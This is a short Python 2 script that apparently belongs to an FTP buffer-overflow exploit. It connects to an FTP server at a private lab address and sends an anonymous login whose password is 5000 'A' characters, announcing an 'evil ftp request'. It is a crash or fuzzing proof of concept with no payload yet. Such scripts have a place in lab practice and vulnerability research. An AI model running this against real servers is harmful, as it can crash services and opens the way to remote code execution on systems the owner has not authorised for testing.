import socket
import os
import sys
from ftplib import FTP

buffer = "A" * 5000

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.120', 21)
ftp.login('anonymous', buffer)

